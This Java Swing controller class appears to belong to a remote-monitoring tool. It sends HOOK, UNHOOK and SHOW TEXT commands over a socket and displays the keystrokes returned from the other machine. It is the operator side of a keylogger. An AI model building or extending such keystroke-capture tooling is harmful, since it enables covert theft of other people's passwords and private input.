package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import javax.swing.*;

import model.Client;

import view.features.*;

public class KeylogListener implements ActionListener{
	
	private KeylogDesign keylogDesign;
	
	public KeylogListener(KeylogDesign keylogDesign)
	{
		this.keylogDesign = keylogDesign;
	}
	
	@Override
	public void actionPerformed(ActionEvent e) {
		if(Client.client == null) {
			JOptionPane.showMessageDialog(null, "Not connected to the server");
			return;
		}
		
		String click = e.getActionCommand();
		String keylogString = null;
		String tempString =  null;
		boolean isHook = false;
		
		if ("HOOK".equals(click))
		{
			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}			
			//JOptionPane.showMessageDialog(null, "Start Hook");	
		}
		
		else if ("UNHOOK".equals(click))
		{

			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
				
			//JOptionPane.showMessageDialog(null, "Start UnHook");
		}
		else if ("SHOW TEXT".equals(click))
		{
			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
			
			try {
				keylogString = Client.in.readLine();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		    this.keylogDesign.txtKeylog.append(keylogString); 
	  
		        
		}
		else if ("CLEAR TEXT".equals(click))
		{			
			this.keylogDesign.txtKeylog.setText("");		
		}
		
	}
	
	
}
